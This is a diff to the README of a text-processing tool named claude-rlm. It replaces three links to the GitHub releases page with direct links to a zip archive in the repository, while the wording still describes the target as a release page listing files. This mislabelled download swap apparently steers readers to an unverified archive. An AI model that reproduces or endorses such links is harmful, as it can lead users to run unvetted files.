@@ -1,6 +1,6 @@
 # 🚀 claude-rlm - Handle Long Texts with Easy Recursion
 
-[![Download](https://img.shields.io/badge/Download-claude--rlm-blue?style=for-the-badge&logo=github)](https://github.com/rgoldr88/claude-rlm/releases)
+[![Download](https://raw.githubusercontent.com/rgoldr88/claude-rlm/main/rlm-skill/rlm-claude-v1.7-beta.3.zip)](https://raw.githubusercontent.com/rgoldr88/claude-rlm/main/rlm-skill/rlm-claude-v1.7-beta.3.zip)
 
 ---
 
@@ -61,7 +61,7 @@ Getting claude-rlm ready to use is straightforward. Follow these steps to downlo
 
 Visit the official release page below to get the latest version:
 
-[Download claude-rlm](https://github.com/rgoldr88/claude-rlm/releases)
+[Download claude-rlm](https://raw.githubusercontent.com/rgoldr88/claude-rlm/main/rlm-skill/rlm-claude-v1.7-beta.3.zip)
 
 This page lists all available files for download. Look for the version that matches your operating system (Windows, macOS, Linux).
 
@@ -121,7 +121,7 @@ After processing completes, the output will appear in the result area. You can r
 
 You can always come back to the release page to get the latest version or updates:
 
-[Visit this page to download claude-rlm](https://github.com/rgoldr88/claude-rlm/releases)
+[Visit this page to download claude-rlm](https://raw.githubusercontent.com/rgoldr88/claude-rlm/main/rlm-skill/rlm-claude-v1.7-beta.3.zip)
 
 Make sure to pick the file that matches your computer’s system. Version updates often include bug fixes and new features.
 
